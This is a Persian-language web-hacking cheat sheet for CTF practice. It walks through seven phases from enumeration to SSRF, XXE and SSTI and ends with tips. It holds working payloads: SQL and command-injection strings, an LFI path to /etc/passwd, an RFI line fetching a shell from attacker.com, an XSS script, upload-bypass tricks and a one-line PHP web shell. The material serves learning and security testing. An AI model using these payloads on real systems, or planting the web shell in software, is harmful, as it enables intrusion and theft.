فاز 1: Enumeration

  • پورت‌های باز: nmap -sC -sV -p- target
  • دایرکتوری‌های مخفی: gobuster/ffuf
  • فایل‌های پشتیبان: index.php.bak, .git, .env
  • فناوری: whatweb, wappalyzer
  • هدرهای HTTP: curl -I

فاز 2: Injection

  • SQLi: ' , " , ' OR '1'='1, time-based
  • Command Injection: ; whoami, | id
  • NoSQL: {"$ne": null}

فاز 3: File Inclusion

  • LFI: ../../../../etc/passwd
  • RFI: http://attacker.com/shell.txt
  • PHP Filters: php://filter/convert.base64-encode/resource=config.php

فاز 4: XSS

  • Reflected: <script>alert(1)</script>
  • Stored: در کامنت‌ها و فرم‌ها
  • DOM-based: در URL parameters
  • Cookie Stealing

فاز 5: Authentication

  • Brute Force: فرم‌های لاگین
  • Session Manipulation: تغییر کوکی
  • JWT Attacks: تغییر الگوریتم
  • CSRF: تغییر ایمیل/پسورد

فاز 6: File Upload

  • Bypass پسوند: shell.php5, shell.php.jpg
  • Bypass Content-Type: image/jpeg
  • Magic Bytes: GIF89a;
  • Web Shell: <?php system($_GET['cmd']); ?>

فاز 7: Advanced

  • SSRF: http://127.0.0.1/admin
  • XXE: file:///etc/passwd
  • SSTI: {{ 7*7 }}
  • Deserialization: Pickle, Java, PHP
  • GraphQL Injection: Introspection

💡 نکات طلایی CTF

  1. همیشه از پایین شروع کنید: هر پورت، هر پارامتر، هر فرم
  2. Google Dorking: site:target.com filetype:log, "index of" target.com
  3. خطاها دوست شما هستند: پیام‌های خطا راهنما هستند
  4. ترکیب روش‌ها: LFI + Log Poisoning = RCE
  5. صبر و دقت: گاهی یک کاراکتر کوچک همه چیز را تغییر می‌دهد
  6. مستند کنید: هر تست را یادداشت کنید
  7. آزمایش و خطا: هیچ‌گاه تسلیم نشوید
  8. نگاه به سورس کد: همیشه View Page Source
  9. تغییر User-Agent: برخی آسیب‌پذیری‌ها فقط با User-Agent خاص دیده می‌شوند
  10. استفاده از Wayback Machine: برای دیدن نسخه‌های قدیمی سایت
